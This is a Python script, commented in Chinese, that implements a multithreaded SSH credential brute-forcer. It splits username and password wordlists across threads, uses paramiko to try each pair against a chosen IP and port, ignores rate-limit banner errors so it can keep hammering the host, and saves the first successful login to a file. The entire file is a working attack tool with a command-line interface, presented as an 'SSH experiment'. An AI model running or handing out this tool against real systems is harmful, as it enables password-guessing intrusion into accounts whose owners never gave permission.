#!/usr/bin/python3
# -*- coding: utf-8 -*-

import optparse
import sys
import os
import threading
import paramiko


class ThreadWork(threading.Thread):
	def __init__(self,ip,usernameBlocak,passwordBlocak,port):
		threading.Thread.__init__(self)
		self.ip = ip;
		self.port = port
		self.usernameBlocak = usernameBlocak
		self.passwordBlocak = passwordBlocak
	
	def run(self,username,password):
		'''
			用死循环防止因为Error reading SSH protocol banner错误
			导致线程没有验证账号密码是否正确就抛弃掉
		'''
		while True:
			try:
				# 设置日志文件
				paramiko.util.log_to_file("SSHattack.log")
				ssh = paramiko.SSHClient()
				# 接受不在本地Known_host文件下的主机
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				# 用sys.stdout.write输出信息，解决用print输出错位问题
				sys.stdout.write("[*]ssh[{}:{}:{}] => {}\n".format(username, password, self.port, self.ip))
				ssh.connect(hostname=self.ip, port=self.port, username=username, password=password, timeout=10)
				ssh.close()
				print("[+]success!!! username: {}, password: {}".format(username, password))
				# 把结果写入到result文件
				resultFile = open('result', 'a')
				resultFile.write("success!!! username: {}, password: {}".format(username, password))
				resultFile.close()
				# 程序终止，0表示正常退出
				os._exit(0)
			except paramiko.ssh_exception.AuthenticationException as e:
				# 捕获Authentication failed错误
				# 说明账号密码错误break跳出循环
				break
			except paramiko.ssh_exception.SSHException as e:
				# 捕获Error reading SSH protocol banner错误
				# 请求过多导致的问题,pass忽略掉让线程继续请求直到该次请求的账号密码被验证
				pass
	
	def start(self):
			# 从账号子块和密码子块中提取数据分配给线程进行爆破
			for userItem in self.usernameBlocak:
				for pwdItem in self.passwordBlocak:
					self.run(userItem,pwdItem)


# 列表分块函数
def partition(list, num):
	# step为每个子列表的长度
	step = int(len(list) / num)
	# 若子列表不够除为0时,就把step设置为子线程数
	if step == 0:
		step = num
	partList = [list[i:i+step] for i in range(0,len(list),step)]
	return partList


def SshExploit(ip,usernameFile,passwordFile,threadNumber,sshPort):
	print("============爆破信息============")
	print("IP:" + ip)
	print("UserName:" + usernameFile)
	print("PassWord:" + passwordFile)
	print("Threads:" + str(threadNumber))
	print("Port:" + sshPort)
	print("=================================")

	# 读取账号文件和密码文件并存入对应列表
	listUsername = [line.strip() for line in open(usernameFile)]
	listPassword = [line.strip() for line in open(passwordFile)]
	# 账号列表和密码列表根据线程数量进行分块
	blockUsername = partition(listUsername, threadNumber)
	blockPassword = partition(listPassword, threadNumber)
	threads = []
	# 每个线程分配一个账号密码子块
	for sonUserBlock in blockUsername:
		for sonPwdBlock in blockPassword:
			work = ThreadWork(ip,sonUserBlock, sonPwdBlock,sshPort)
			# 创建线程
			workThread = threading.Thread(target=work.start)
			# 在threads中加入线程
			threads.append(workThread)
	# 开始子线程
	for t in threads:
		t.start()
	# 阻塞主线程，等待所有子线程完成工作
	for t in threads:
		t.join()


if __name__ == '__main__':
	
	print("\n#####################################")
	print("#          SSH  experiment         #")
	print("#####################################\n")
	
	parser = optparse.OptionParser('usage: python %prog target [options] \n\n'
									'Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n')
	# 添加目标主机参数-i
	parser.add_option('-i', '--ip', dest='IP',
						default='127.0.0.1', type='string',
						help='target IP')
	# 添加线程参数-t
	parser.add_option('-t', '--threads', dest='threadNum',
						default=10, type='int',
						help='Number of threads [default = 10]')
	# 添加用户名文件参数-u
	parser.add_option('-u', '--username', dest='userName',
						default='./username', type='string',
						help='username file')
	# 添加密码文件参数-p
	parser.add_option('-p', '--password', dest='passWord',
						default='./password', type='string',
						help='password file')
	# 添加SSH端口参数-P
	parser.add_option('-P', '--port', dest='port',
						default='22', type='string',
						help='ssh port')
	(options, args) = parser.parse_args()
	
	SshExploit(options.IP, options.userName, options.passWord, options.threadNum,options.port)
